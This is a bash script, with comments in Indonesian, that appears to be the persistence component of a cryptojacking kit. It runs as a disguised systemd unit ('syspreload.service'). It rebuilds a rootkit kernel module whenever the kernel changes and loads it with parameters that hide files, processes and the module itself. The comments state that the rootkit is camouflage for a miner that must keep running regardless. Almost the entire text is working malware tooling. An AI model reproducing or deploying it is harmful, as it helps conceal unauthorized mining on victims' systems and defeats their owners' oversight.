#!/usr/bin/env bash
# rk-boot.sh — muat modul rootkit, rebuild otomatis bila kernel berubah.
#
# Dipakai sebagai ExecStart unit syspreload.service. Kode keluar 0 SELALU:
# modul adalah lapisan kamuflase, bukan syarat miner. Kalau build/insmod
# gagal, miner tetap harus jalan (unit memakai Wants=, bukan Requires=).
#
#   KDIR_OVERRIDE=/path/to/build ./rk-boot.sh
#   VERBOSE=1 ./rk-boot.sh
#
# KEAMANAN: script ini berjalan sebagai root. JANGAN memakai path /tmp dengan
# nama tetap (symlink attack: user lokal bisa membuat /tmp/rk-boot-*.log
# sebagai symlink ke /etc/shadow). Semua file sementara dibuat di direktori
# privat 0700 dari mktemp, dengan trap cleanup.
set -u
umask 077
cd "$(dirname "$0")"

KO="rootkit.ko"
SRC="rootkit.c"
PREFIX="${PREFIX:-rk_}"
MAGIC="${MAGIC:-64}"
UNHIDE="${UNHIDE:-63}"
HIDEMOD="${HIDEMOD:-1}"
KVER="$(uname -r)"
KDIR="${KDIR_OVERRIDE:-/lib/modules/${KVER}/build}"
LOGFILE="${LOGFILE:-/var/log/rk-boot.log}"

WORKDIR="$(mktemp -d /run/rk-boot.XXXXXX 2>/dev/null || mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT INT TERM

# Semua baris log ditulis ke stdout (dari systemd) dan ke file, supaya
# bisa dicek setelah service selesai: journalctl -u syspreload / cat /var/log/rk-boot.log
log() {
  local line="[rk-boot] $*"
  echo "$line"
  printf '%s %s\n' "$(date -Is 2>/dev/null)" "$line" >> "$LOGFILE" 2>/dev/null || true
}

# Modul sudah termuat? module->list tidak diubah oleh modul ini, jadi lsmod
# dan /proc/modules tetap bisa dipakai. /sys/module juga tetap ada.
if [ -d /sys/module/rootkit ]; then
  log "rootkit sudah loaded"
  exit 0
fi

# Vermagic .ko harus cocok dengan kernel berjalan, kalau tidak insmod menolak.
need_build=0
if [ ! -f "$KO" ]; then
  need_build=1
  log "$KO tidak ada -> build"
elif command -v modinfo >/dev/null; then
  if [ "$(modinfo -F vermagic "$KO" 2>/dev/null | awk '{print $1}')" != "$KVER" ]; then
    need_build=1
    log "vermagic .ko != $KVER -> rebuild"
  fi
fi

if [ "$need_build" = "1" ]; then
  if [ ! -d "$KDIR" ]; then
    log "tidak ada headers $KDIR, module tidak bisa dibangun (pakai .ko lama)"
  elif ! command -v make >/dev/null || ! command -v gcc >/dev/null; then
    log "gcc/make tidak ada, module tidak bisa dibangun (pakai .ko lama)"
  else
    BUILD_DIR="$WORKDIR/build"
    mkdir -p "$BUILD_DIR"
    if cp -f "$PWD/$SRC" "$BUILD_DIR/$SRC"; then
      cat > "$BUILD_DIR/Makefile" <<'MKEOF'
obj-m += rootkit.o
KDIR ?= /lib/modules/$(shell uname -r)/build
all:
	$(MAKE) -C $(KDIR) M=$(CURDIR) modules
clean:
	$(MAKE) -C $(KDIR) M=$(CURDIR) clean
.PHONY: all clean
MKEOF
      log "build untuk $KVER di $BUILD_DIR ..."
      if make -C "$BUILD_DIR" KDIR="$KDIR" all >"$WORKDIR/build.log" 2>&1; then
        if [ -f "$BUILD_DIR/rootkit.ko" ]; then
          cp -f "$BUILD_DIR/rootkit.ko" "$PWD/rootkit.ko" 2>/dev/null || true
          cp -f "$BUILD_DIR/rootkit.ko" /opt/sysconf/rootkit.ko 2>/dev/null || true
          log "build OK, .ko diperbarui"
        else
          log "build OK tapi rootkit.ko tidak ditemukan"
        fi
      else
        log "build GAGAL, lihat journal ($WORKDIR sudah dibersihkan)"
        sed -n '1,5p' "$WORKDIR/build.log" 2>/dev/null | while read -r l; do log "  $l"; done
      fi
    else
      log "gagal menyalin $SRC ke build dir"
    fi
  fi
fi

[ -f "$KO" ] || { log "tidak ada $KO, skip"; exit 0; }

# Pasang modul. Kegagalan tidak boleh menggagalkan boot.
if insmod "$KO" hide_prefix="$PREFIX" proc_prefix="$PREFIX" \
      sig_magic="$MAGIC" sig_unhide="$UNHIDE" hide_module="$HIDEMOD" 2>"$WORKDIR/insmod.log"; then
  log "rootkit loaded (kernel $KVER)"
else
  log "insmod GAGAL: $(head -1 "$WORKDIR/insmod.log" 2>/dev/null)"
fi
exit 0
